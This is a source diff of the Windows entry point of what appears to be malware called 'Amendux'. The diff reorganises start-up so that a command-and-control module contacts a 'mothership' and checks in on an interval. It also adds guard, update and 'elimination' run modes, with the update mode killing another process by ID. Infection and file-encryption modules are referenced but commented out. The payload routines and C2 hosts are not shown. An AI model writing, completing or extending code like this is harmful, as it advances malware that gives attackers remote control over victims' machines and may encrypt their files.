@@ -11,15 +11,15 @@
 #define MAX_LOADSTRING 100
 
 // Global modules
-// Amendux::Encrypt FileCrypt;						// File encryptor module
-Amendux::Config cfg;							// Common config
-Amendux::Candcel Commander;						// Command and Control
+// Amendux::Encrypt FileCrypt;                  // File encryptor module
+Amendux::Candcel Commander;                     // Command and Control
 
 // Global Variables:
 HINSTANCE hInst;                                // Current instance
 HANDLE hMutex;									// Instance mutx lock
 WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
 WCHAR szWindowClass[MAX_LOADSTRING];            // The main window class name
+
 
 // Forward declarations of functions included in this code module:
 ATOM                MainRegisterClass(HINSTANCE hInstance);
@@ -49,20 +49,25 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
         return false;
     }
 
-	// Initialize and configure modules
+	// Initialize modules
 	Amendux::Log::Init();
-	// Amendux::Config::Init(FileCrypt);
+	Amendux::Config::Init();
 
-	// Window accelerators
-    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));
+	// If anything failed at this moment, disengage
+	if (!Amendux::Config::Success()) {
+		goto TerminateInstance;
+	}
 
 	// Establish communications with mothership
-	Commander.IsAlive();
-	Commander.Solicit();
-	// Commander.CheckForUpdate();
+	Amendux::Candcel::Init();
+	// Amendux::Infect::Init();
+	// Amendux::Module::Init();
 
-	// Launch the guard
+	// Launch the checkin process
 	Amendux::Candcel::SpawnInterval(&Commander);
+
+	// Window accelerators
+	HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));
 
 	// Main message loop
     MSG msg;
@@ -73,7 +78,11 @@ int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmd
         }
     }
 
-	// Terminate modules
+TerminateInstance:
+
+	// Terminate modules in reverse order
+	Amendux::Candcel::Terminate();
+	Amendux::Config::Terminate();
 	Amendux::Log::Terminate();
 
 	// Perform application cleanup
@@ -94,8 +103,7 @@ ATOM MainRegisterClass(HINSTANCE hInstance)
 {
     WNDCLASSEXW wcex;
 
-    wcex.cbSize = sizeof(WNDCLASSEX);
-
+    wcex.cbSize         = sizeof(WNDCLASSEX);
     wcex.style          = CS_HREDRAW | CS_VREDRAW;
 	wcex.lpfnWndProc	= WndProc;
     wcex.cbClsExtra     = 0;
@@ -186,7 +194,6 @@ BOOL ParseCommandLine()
 {
 	LPWSTR *szArgList;
 	int argCount;
-	bool bContinueExec = true;
 
 	szArgList = CommandLineToArgvW(GetCommandLine(), &argCount);
 	if (!szArgList || argCount < 1) {
@@ -203,32 +210,30 @@ BOOL ParseCommandLine()
 				continue;
 			}
 
-			// MessageBox(NULL, (std::wstring(L"Update process running => ") + szArgList[i + 1]).c_str(), L"Update", MB_OK);
-			Amendux::Process::KillProcessId(pid);
-			cfg.DisableUpdate();
+			Amendux::Config::Current()->SetMode(Amendux::OperationMode::UPDATE);
+			Amendux::Process::EndProcess(pid);
+
+			while (true);
+			return true;
 		}
 
 		// Spawn a guard
 		if (!wcscmp(szCmd, L"/sg") || !wcscmp(szCmd, L"/SG")) {
-#if DEBUG
-			MessageBox(NULL, L"Spwan guard [TODO]", L"Guard", MB_OK);
-#endif
-			bContinueExec = false;
+			Amendux::Config::Current()->SetMode(Amendux::OperationMode::GUARD);
+			return true;
 		}
 
 		// Run elimination mode
 		if ((!wcscmp(szCmd, L"/el") || !wcscmp(szCmd, L"/EL")) && argCount > 2) {
-#if DEBUG
-			MessageBox(NULL, L"Eliminate instance [TODO]", L"Eliminate", MB_OK);
-#endif
-			bContinueExec = false;
+			Amendux::Config::Current()->SetMode(Amendux::OperationMode::ELIMINATE);
+			return true;
 		}
 
 	}
 
 	LocalFree(szArgList);
 
-	return bContinueExec;
+	return true;
 }
 
 
@@ -324,4 +329,3 @@ INT_PTR CALLBACK Debug(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
 
 	return (INT_PTR)FALSE;
 }
-
